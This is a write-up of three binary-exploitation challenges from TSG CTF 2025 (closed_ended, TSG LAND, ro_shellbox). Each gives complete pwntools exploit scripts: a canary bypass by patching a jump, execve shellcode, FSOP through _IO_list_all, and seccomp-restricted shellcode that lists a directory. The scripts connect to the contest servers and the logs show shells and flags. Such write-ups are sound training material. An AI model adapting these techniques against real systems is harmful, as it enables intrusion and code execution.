# TSG CTF 2025

## preface

I played TSG CTF with 2 teammates in team `Hybird Theory`.

We got a 14th place among all teams, 8th place among domestic teams.

This year's TSG CTF will hold a final round in the next Spring.

![](screencapture-score-ctf-tsg-ne-jp-teams-28-2025-12-21-16_30_55.png)

## closed_ended

The source code was quite simple.
```c
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>

int main() {
    void* addr;
    char buf[10];

    mprotect((void*)0x401000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);

    if (close(1) != 0 || scanf("%p", &addr) != 1)
        return 0;

    if ((unsigned long)addr < 0x4010a7 || (unsigned long)addr > 0x402000) 
        return 0;

    if (scanf("%*c%c", (char*)addr) != 1)
        return 0;

    mprotect((void*)0x401000, 0x1000, PROT_READ | PROT_EXEC);

    scanf("%100s", buf);
    return 0;
}
```

The first step of my exploit is killing the canary.
```C
004010a7  488b45f8           mov     rax, qword [rbp-0x8 {var_10}]
004010ab  64482b0425280000…  sub     rax, qword [fs:0x28]
004010b4  7561               jne     0x401117

004010b6  c9                 leave    {__saved_rbp}
004010b7  31c0               xor     eax, eax  {0x0}
004010b9  c3                 retn     {__return_addr}
```
Overwrite a relative-offset of `jne` instruction(e.g., `004010b4 7561 jne 0x401117`->`004010b4 7500 jne 0x4010b6`)
In a nutshell, never-branching to `__stk_chk_fail`.

Next, return to main(0x401070). `close(0)` will be failed and immediately return with no canary checking.
Through this process, the region between 0x401000~0x402000 became `rwx`.

It's smooth sailing from here. Adding `PROC_EXEC`, Making `rw` address which used for stack-pivot executable...
And Finally, execute a shellcode and win for a shell.

```py
from pwn import *
from icecream import ic
import sys
import re
import inspect

e = ELF("closed_ended",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.84.25.24 50037"
if "nc" in nc:
    HOST = nc.split(" ")[1]
    PORT = int(nc.split(" ")[2])
if "http" in nc:
    from urllib.parse import urlparse
    HOST = urlparse(nc).hostname
    PORT = urlparse(nc).port

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
    b *0x004010c3
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sln  = lambda b: io.sendline(str(b).encode())
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
fsp = lambda b : f"%{b}$p".encode()
shell = lambda : io.interactive()

def hl(v: int): print(f"{(m := re.search(r'hl\s*\(\s*(.+?)\s*\)', inspect.getframeinfo(inspect.currentframe().f_back).code_context[0].strip())) and m.group(1) or '?'}: {hex(v)}")

payload = b""
def rst():global payload;payload = b"";log.info("***PAYLOAD RESET***")
def pay(*args, **kwargs): global payload; payload += b"".join([a if type(a) == bytes else (a.encode() if type(a) == str else p64(a)) for a in args])

pop_rbp = 0x004011ed
ret = 0x004011ee

sl(b"0x004010b5")

s(p8(0x0))

pay(
    0xdeadbeafdeadbeef,
    0xdeadbeafdeadbeef,
    b"A"*0x2,
    0x0404d00,
    0x0401070,
    ret, 
    0x00401105,
)
sl(payload)

rst()
pay(
    b"A"*0x12,
    0x0404d00,
    0x004010ba,
    0xdeadbeafdeadbee1,
    0xdeadbeafdeadbee2,
    0xdeadbeafdeadbee3,
    0xdeadbeafdeadbee4,
    0xdeadbeafdeadbee5,
    0xdeadbeafdeadbee6,
    0xdeadbeafdeadbee7,
    0xdeadbeafdeadbee8,
)
sl(payload)

sl(b"0x004010f2")
s(p8(0x07))

rst()
pay(
    b"A"*0x12,
    0x0404d00,
    0x004010ba,
    0xcafecafeabad1de3,
    0xcafecafeabad1de4,
    0xcafecafeabad1de5,
    0xcafecafeabad1de6,
    0xcafecafeabad1de7,
    0xcafecafeabad1de8,
)
sl(payload)

sl(b"0x004010fd")
sl(p8(0x40))


rst()
pay(
    b"A"*0x12,
    0x0404d00,
    0x000000404d10,
    asm("""
       	xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
        """)
)
sl(payload)

shell()

"""
[~/dc/ctf/tsg/closed_ended]$python3 e.py r
[+] Opening connection to 34.84.25.24 on port 50037: Done
[*] ***PAYLOAD RESET***
[*] ***PAYLOAD RESET***
[*] ***PAYLOAD RESET***
[*] Switching to interactive mode
$ ls 1>&2
closed_ended
flag-5d96a24b3270740fdc4d13d925526dc1.txt
start.sh
$ cat flag* 1>&2
TSGCTF{3sc4ped_c105e_m3men7o_v1v3r3_4e80ef421b2bcd3ae38cda}
[*] Got EOF while reading in interactive
"""
```

## TSG LAND

The binary implements 4 functions with restoring system using `setjmp`,`longjmp`.
```c
void *apps[5] = {NULL, notepad, pwquiz, slide_puzzle, int_float_translater};

void print_desktop() {
    puts("...");
    puts("1: notepad.exe");
    puts("2: password ate quiz ~returns~");
    puts("3: 4x4 slide puzzle");
    puts("4: int float translater");
    puts("0: exit TSG LAND");
}
```

The bug is the stack corruption.

4x4 puzzle
```C
[password quiz hint pointer]    [notepad pointer]
XXXXX XXXXX                     XXXXX XXXXX
XXXXX XXXXX                     XXXXX XXXXX
[int float buffer]              XXXXX XXXXX
```

Set arbitrary 64-bit value with `int float translater`, move it with `4x4 slide puzzle` to 1. `notepad pointer` for aaw, 2. `passwd quiz hint pointer` for aar.

First I leaked binary address from `password quiz hint pointer`.

Next I read binary's got segment to leak `libc` address.

And the last, I did `fsop` with overwrite `_IO_list_all`.

The puzzle was too tired for me :cry:.
```py
from pwn import *
from icecream import ic
import sys
import re
import inspect

e = ELF("chall_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-2.35.so",checksec=False)

nc = "nc 34.84.25.24 13579"
if "nc" in nc:
    HOST = nc.split(" ")[1]
    PORT = int(nc.split(" ")[2])
if "http" in nc:
    from urllib.parse import urlparse
    HOST = urlparse(nc).hostname
    PORT = urlparse(nc).port

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sln  = lambda b: io.sendline(str(b).encode())
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
fsp = lambda b : f"%{b}$p".encode()
shell = lambda : io.interactive()

def hl(v: int): print(f"{(m := re.search(r'hl\s*\(\s*(.+?)\s*\)', inspect.getframeinfo(inspect.currentframe().f_back).code_context[0].strip())) and m.group(1) or '?'}: {hex(v)}")

payload = b""
def rst():global payload;payload = b"";log.info("***PAYLOAD RESET***")
def pay(*args, **kwargs): global payload; payload += b"".join([a if type(a) == bytes else (a.encode() if type(a) == str else p64(a)) for a in args])

# --- BINARY LEAK ---

sln(3)
sl(b"q")

sln(2)
sln(0)
ru(b"Welcome")
ru(b"Welcome")
ru(b"Welcome")
ru(b"> ")
sln(3)
leak1 = rl()
ic(leak1)
leak1_1 = int(leak1.split(b" ")[0])&0xffffffff
leak1_2 = int(leak1.split(b" ")[1])&0xffffffff
leak1 = leak1_2<<32 | leak1_1
hl(leak1)
e.address = leak1 - (0x619ab12ae080-0x0000619ab12ac000)
hl(e.address)

sl(b"q")
sln(4)
sln(1)
sln(e.got["puts"])
sln(0)

sln(3)
sl(b"s")
sl(b"s")

sl(b"d")
sl(b"d")
sl(b"d")

sl(b"w")
sl(b"w")

sl(b"a")
sl(b"a")
sl(b"a")

sl(b"s")
sl(b"s")
sl(b"s")

sl(b"d")
sl(b"d")
sl(b"d")

sl(b"w")
sl(b"a")
sl(b"s")
sl(b"a")
sl(b"w")

sl(b"q")
sl(b"2")
sl(b"3")

ru(b"1~3: hint")
leak2 = rl()
ic(leak2)
leak2 = leak2.split(b"> ")[1].strip()
leak2 = pu64(leak2)
hl(leak2)

libc.address = leak2 - (0x768477e80e50 - 0x0000768477e00000)

def fsop_IO_list_all(addr):
    fs  = b"/bin/sh".ljust(8, b'\0')
    fs += p64(1)
    fs += p64(libc.sym["system"])
    fs += b"\x00" * (0x88 - len(fs))
    fs += p64(addr+0x18)
    fs += b"\x00" * (0xa0 - len(fs))
    fs += p64(addr - 0x10)
    fs += b"\x00" * (0xc0 - len(fs))
    fs += p32(1)
    fs += b"\x00" * (0xd0 - len(fs))
    fs += p64(addr - 0x8)
    fs += p64(libc.sym["_IO_wfile_jumps"] + 0x48 - 0x18)

    return fs

sln(0)
sln(1)
sln(0)
ru(b"Welcome")
ru(b"Welcome")
ru(b"> ")
sln(3)
leak3 = rl()
ic(leak3)
leak3_1 = int(leak3.split(b" ")[2])&0xffffffff
leak3_2 = int(leak3.split(b" ")[3])&0xffffffff
leak3 = leak3_2<<32 | leak3_1
hl(leak3)
sl(b"q")
sln(1)
sln(1)
sl(fsop_IO_list_all(leak3))
sln(0)

sln(4)
sln(1)
sln(libc.sym["_IO_list_all"])
sln(0)

sln(3)

sl(b"d")
sl(b"w")
sl(b"a")
sl(b"s")
sl(b"s")
sl(b"d")
sl(b"d")
sl(b"s")
sl(b"w")
sl(b"w")
sl(b"a")
sl(b"a")
sl(b"s")
sl(b"s")
sl(b"d")
sl(b"d")
sl(b"w")
sl(b"w")
sl(b"a")
sl(b"a")
sl(b"s")
sl(b"s")
sl(b"d")
sl(b"w")
sl(b"a")
sl(b"s")
sl(b"d")
sl(b"d")
sl(b"w")
sl(b"a")
sl(b"a")
sl(b"a")
sl(b"s")
sl(b"d")
sl(b"d")

sl(b"q")
sln(1)
sln(1)
sl(p64(leak3))
sln(0)
sln(0)

shell()

"""
$ ls
chall
flag-8b4b6f4f4c4d2cb7b9cde45548e7bf8f.txt
libc.so.6
start.sh
$ cat flag*
TSGCTF{W3_4re_l00k1n9_4_5ee1n9_y0u_1n_TSGLAND_a9a1n_ff7c51fb6d50f181}
$ 
[*] Interrupted
[*] Closed connection to 34.84.25.24 port 13579
"""
```

## ro_shellbox

In this challenge. I could run shellcode with following restrictions:

1. 32bit syscall has been prohibited to execute
2. `execve`, `execveat` has been prohibited to execute
3. `rip`-relative `lea` instruction has been prohibited to exists in shellcode
4. `wrfsbase` has been prohibited to exists in shellcode
5. `syscall` has been prohibited to exists in shellcode
6. all shared libraries have been prohibited to execute
7. all general-purpose registers have been completely cleared.
8. the address of shellcode will become read/execute only.

First thing that came to mind is using AVX instruction to exclude `rip`-relative instruction. (like a `vexed` challenge from [](GreyCTF-2025.md))

To be blunt, that mind was misleading. I could gain a rip address using a 0-relative call and popping the address.

```nasm
call $+0x5
pop r12 ; r12:current rip
```

Now I have a $rip.

After a heavy considering, I noticed that the SIMD registers haven't been cleared.
>  7. all general-purpose registers have been completely cleared.

Yes! the SIMD registers have not been cleared.
```c
(gdb) b *main+829
Breakpoint 1 at 0x5abc7a922c29
(gdb) c
Continuing.

Breakpoint 1, 0x00005abc7a922c29 in main ()
(gdb) info registers sse
xmm0           {v8_bfloat16 = {0xa803, 0xb007, 0x7815, 0x0, 0xa803, 0xb007, 0x7815, 0x0}, v8_half = {0xa803, 0xb007, 0x7815, 0x0, 0xa803, 0xb007, 0x7815, 0x0}, v4_float = {0xb007a803, 0x7815, 0xb007a803, 0x7815}, v2_double = {0x7815b007a803, 0x7815b007a803}, v16_int8 = {0x3, 0xa8, 0x7, 0xb0, 0x15, 0x78, 0x0, 0x0, 0x3, 0xa8, 0x7, 0xb0, 0x15, 0x78, 0x0, 0x0}, v8_int16 = {0xa803, 0xb007, 0x7815, 0x0, 0xa803, 0xb007, 0x7815, 0x0}, v4_int32 = {0xb007a803, 0x7815, 0xb007a803, 0x7815}, v2_int64 = {0x7815b007a803, 0x7815b007a803}, uint128 = 0x7815b007a80300007815b007a803}
xmm1           {v8_bfloat16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x0, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x0 <repeats 16 times>}, v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x0, 0x0, 0x0, 0x0}, v2_int64 = {0x0, 0x0}, uint128 = 0x0}
xmm2           {v8_bfloat16 = {0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0xff, 0x0, 0x0, 0x0}, v2_double = {0xff, 0x0}, v16_int8 = {0xff, 0x0 <repeats 15 times>}, v8_int16 = {0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0xff, 0x0, 0x0, 0x0}, v2_int64 = {0xff, 0x0}, uint128 = 0xff}
xmm3           {v8_bfloat16 = {0x780, 0x2457, 0x7ffc, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x780, 0x2457, 0x7ffc, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x24570780, 0x7ffc, 0x0, 0x0}, v2_double = {0x7ffc24570780, 0x0}, v16_int8 = {0x80, 0x7, 0x57, 0x24, 0xfc, 0x7f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_int16 = {0x780, 0x2457, 0x7ffc, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x24570780, 0x7ffc, 0x0, 0x0}, v2_int64 = {0x7ffc24570780, 0x0}, uint128 = 0x7ffc24570780}
xmm4           {v8_bfloat16 = {0x1210, 0x2457, 0x7ffc, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x1210, 0x2457, 0x7ffc, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x24571210, 0x7ffc, 0x0, 0x0}, v2_double = {0x7ffc24571210, 0x0}, v16_int8 = {0x10, 0x12, 0x57, 0x24, 0xfc, 0x7f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_int16 = {0x1210, 0x2457, 0x7ffc, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x24571210, 0x7ffc, 0x0, 0x0}, v2_int64 = {0x7ffc24571210, 0x0}, uint128 = 0x7ffc24571210}
xmm5           {v8_bfloat16 = {0xd98, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0xd98, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0xd98, 0x0, 0x0, 0x0}, v2_double = {0xd98, 0x0}, v16_int8 = {0x98, 0xd, 0x0 <repeats 14 times>}, v8_int16 = {0xd98, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0xd98, 0x0, 0x0, 0x0}, v2_int64 = {0xd98, 0x0}, uint128 = 0xd98}
xmm6           {v8_bfloat16 = {0x60, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x60, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x60, 0x0, 0x0, 0x0}, v2_double = {0x60, 0x0}, v16_int8 = {0x60, 0x0 <repeats 15 times>}, v8_int16 = {0x60, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x60, 0x0, 0x0, 0x0}, v2_int64 = {0x60, 0x0}, uint128 = 0x60}
xmm7           {v8_bfloat16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x0, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x0 <repeats 16 times>}, v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x0, 0x0, 0x0, 0x0}, v2_int64 = {0x0, 0x0}, uint128 = 0x0}
xmm8           {v8_bfloat16 = {0x3030, 0x303a, 0x2030, 0x2030, 0x2020, 0x2020, 0x2020, 0x2020}, v8_half = {0x3030, 0x303a, 0x2030, 0x2030, 0x2020, 0x2020, 0x2020, 0x2020}, v4_float = {0x303a3030, 0x20302030, 0x20202020, 0x20202020}, v2_double = {0x20302030303a3030, 0x2020202020202020}, v16_int8 = {0x30, 0x30, 0x3a, 0x30, 0x30, 0x20, 0x30, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20}, v8_int16 = {0x3030, 0x303a, 0x2030, 0x2030, 0x2020, 0x2020, 0x2020, 0x2020}, v4_int32 = {0x303a3030, 0x20302030, 0x20202020, 0x20202020}, v2_int64 = {0x20302030303a3030, 0x2020202020202020}, uint128 = 0x202020202020202020302030303a3030}
xmm9           {v8_bfloat16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x0, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x0 <repeats 16 times>}, v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x0, 0x0, 0x0, 0x0}, v2_int64 = {0x0, 0x0}, uint128 = 0x0}
xmm10          {v8_bfloat16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x0, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x0 <repeats 16 times>}, v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x0, 0x0, 0x0, 0x0}, v2_int64 = {0x0, 0x0}, uint128 = 0x0}
xmm11          {v8_bfloat16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x0, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x0 <repeats 16 times>}, v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x0, 0x0, 0x0, 0x0}, v2_int64 = {0x0, 0x0}, uint128 = 0x0}
xmm12          {v8_bfloat16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x0, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x0 <repeats 16 times>}, v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x0, 0x0, 0x0, 0x0}, v2_int64 = {0x0, 0x0}, uint128 = 0x0}
xmm13          {v8_bfloat16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x0, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x0 <repeats 16 times>}, v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x0, 0x0, 0x0, 0x0}, v2_int64 = {0x0, 0x0}, uint128 = 0x0}
xmm14          {v8_bfloat16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x0, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x0 <repeats 16 times>}, v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x0, 0x0, 0x0, 0x0}, v2_int64 = {0x0, 0x0}, uint128 = 0x0}
xmm15          {v8_bfloat16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v8_half = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_float = {0x0, 0x0, 0x0, 0x0}, v2_double = {0x0, 0x0}, v16_int8 = {0x0 <repeats 16 times>}, v8_int16 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, v4_int32 = {0x0, 0x0, 0x0, 0x0}, v2_int64 = {0x0, 0x0}, uint128 = 0x0}
mxcsr          0x1f80              [ IM DM ZM OM UM PM ]
```

Looks xmm0,xmm3,xmm4 are useful.

> CAUTION
> 
> This sse register dump conducted in AMD CPU.
> 
> The vendor of remote-server's cpu is INTEL(Xeon).
> 
> Since libc switch SIMD processing according the CPU vendor, the statement of SSE registers between local docker and remote process is not equal :angry::angry::angry::angry::angry::angry:
> 
> ```c
> $ ls
> chall
> flag-8b4b6f4f4c4d2cb7b9cde45548e7bf8f.txt
> libc.so.6
> start.sh
> $ uname -a
> Linux a30b746d2bc0 6.1.155+ #1 SMP PREEMPT_DYNAMIC Tue Dec 16 18:05:54 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
> $ cat /proc/cpuinfo
> processor       : 0
> vendor_id       : GenuineIntel
> cpu family      : 6
> model           : 79
> model name      : Intel(R) Xeon(R) CPU @ 2.20GHz
> stepping        : 0
> microcode       : 0xffffffff
> cpu MHz         : 2199.998
> cache size      : 56320 KB
> physical id     : 0
> siblings        : 2
> core id         : 0
> cpu cores       : 1
> apicid          : 0
> initial apicid  : 0
> fpu             : yes
> fpu_exception   : yes
> cpuid level     : 13
> wp              : yes
> flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl xtopology nonstop_tsc cpuid tsc_known_freq pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 erms invpcid rtm rdseed adx smap xsaveopt arat md_clear arch_capabilities
> bugs            : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs taa mmio_stale_data retbleed bhi its
> bogomips        : 4399.99
> clflush size    : 64
> cache_alignment : 64
> address sizes   : 46 bits physical, 48 bits virtual
> power management:
> ```
{style="warning"}

With the help of my teammate who has an Intel processor, $xmm0 is a stable register to leak libc address.

- leak flag file name
1. calculate environ address from libc address of $xmm0
2. set rsp, rbp
3. set fs_base
4. calculate binary address
5. open "." -> since fd 0 has been closed, fd 0 will be reused 
6. getdents64
7. write to stdout

```py

from pwn import *
from icecream import ic
import sys
import re
import inspect

e = ELF("ro_shellbox_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-linux-x86-64.so.2",checksec=False)

nc = "nc 35.194.98.181 42324"
#nc = "nc localhost 42324"

if "nc" in nc:
    HOST = nc.split(" ")[1]
    PORT = int(nc.split(" ")[2])
if "http" in nc:
    from urllib.parse import urlparse
    HOST = urlparse(nc).hostname
    PORT = urlparse(nc).port

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
    b *main+829
    b *safe_box+627
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sln  = lambda b: io.sendline(str(b).encode())
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
fsp = lambda b : f"%{b}$p".encode()
shell = lambda : io.interactive()

def hl(v: int): print(f"{(m := re.search(r'hl\s*\(\s*(.+?)\s*\)', inspect.getframeinfo(inspect.currentframe().f_back).code_context[0].strip())) and m.group(1) or '?'}: {hex(v)}")

payload = b""
def rst():global payload;payload = b"";log.info("***PAYLOAD RESET***")
def pay(*args, **kwargs): global payload; payload += b"".join([a if type(a) == bytes else (a.encode() if type(a) == str else p64(a)) for a in args])

ru(b"input:")

dosyscall = asm("""
mov dword ptr [rbp-0x940],0x0
call rbx
""")

#shellcode = asm(f"""
#test rax, rax
#jz $+0x3
#ret
#vmovq rsp, xmm0
#mov rbx, [rsp+{0x5dd3b9e73880-0x5dd3b9e732a0}]
#add rbx, {0x222200-0x2170c0}
#mov rbx, [rbx]
#mov rsp, rbx
#sub rbx, 0x30
#mov rbx, [rbx]
#sub rbx, {0x00005dd383b882c5-0x00005dd383b87000}
#add rbx, 0x000018be
#sub rsp, 0x100
#mov rbp,rsp
#sub rsp, 0x2000
#""")

shellcode = asm(f"""
test rax, rax
jz $+0x3
ret
vmovq rsp, xmm0
mov rbx, rsp
add rbx, {27133}
mov rbx, [rbx]
mov rsp, rbx
sub rbx, 0x30
mov rbx, [rbx]
sub rbx, {0x00005dd383b882c5-0x00005dd383b87000}
add rbx, 0x000018be
sub rsp, 0x100
mov rbp,rsp
sub rsp, 0x2000
""")

shellcode += asm("""
mov rax, rbp
mov r13, rbp
sub rax, 0x30
call $-85
""")

# open(".", O_RDONLY, 0)
shellcode += asm("""
call $+0x5
pop r12
add r12, 0x2b
xor rax, rax
mov rax, 2
push 0x2E
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov qword ptr [rbp+0x8], r12
""")
shellcode += dosyscall
shellcode += asm("""
nop                 
nop                 
""")

# getdents64(fd, buf, size)
shellcode += asm("""
call $+0x5
pop r12
add r12, 100
mov rdi, 0
mov rax, 217
sub rsp, 0x1000
mov rsi, rsp 
add rsi, 0x200
mov r14, rsi
mov rdx, 0x1000
mov rbp, r13

push rbp
mov rbp, rsp
sub rsp, 0x1000
mov r15, 0xdeadbeaf
mov qword ptr [rbp-0x8], r15
mov qword ptr fs:0x28, r15
mov qword ptr [rbp+0x8], r12
""")
shellcode += dosyscall
shellcode += asm("""
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
""")

# write(1, buf, count)
shellcode += asm("""
call $+0x5
pop r12
add r12, 0x34
mov rdx, 0x200
mov rdi, 1
mov rax, 1
mov rsi, r14
mov rbp, r13
""")
#mov qword ptr [rbp+0x8], r12
shellcode += dosyscall

for i in range(len(shellcode)//16):
    print(hex(u64(shellcode[16*i:16*i+8])),hex(u64(shellcode[16*i+8:16*i+16])))

with open("output_exp","wb") as fd:
    fd.write(shellcode)

input("hlt")
sl(shellcode)
io.shutdown("send")

shell()

"""
[~/dc/ctf/tsg/ro_shellbox]$python3 e.py r
[+] Opening connection to 35.194.98.181 on port 42324: Done
0xe1c4c30174c08548 0x8148e38948c47ef9
0x1b8b48000069fdc3 0x4830eb8348dc8948
0x12c5eb81481b8b 0x18bec3814800
0x4800000100ec8148 0x2000ec8148e589
0x48ed8949e8894800 0xffffffa6e830e883
0x495c4100000000e8 0xc748c031482bc483
0x482e6a00000002c0 0xd23148f63148e789
0xf6c085c70865894c 0xd3ff00000000ffff
0x4100000000e89090 0xc7c74864c483495c
0xd9c0c74800000000 0x1000ec8148000000
0xc68148e689480000 0x48f6894900000200
0x894c00001000c2c7 0xec8148e5894855ed
0xbeafbf4900001000 0x894c00000000dead
0x28253c894c64f87d 0xc70865894c000000
0xfffff6c085 0x9090909090d3ff00
0x9090909090909090 0xe8909090909090
0xc483495c41000000 0x200c2c74834
0x4800000001c7c748 0x894c00000001c0c7
0xf6c085c7ed894cf6 0xd3ff00000000ffff
hlt
[*] Switching to interactive mode

Safe Input!
Secure the Shellbox
G\x0b
\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04..\x00\x00\x00O\x0b
\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00 \x00\x08start.sh\x00\x99~\x00\x00H\x0b
\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04.\x00\x00\x00\x00I\x0b
\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00@\x00\x08flag-528f44c64deac370831edc02aa79f7b5.txt\x00\x00\x00\x00N\x0b
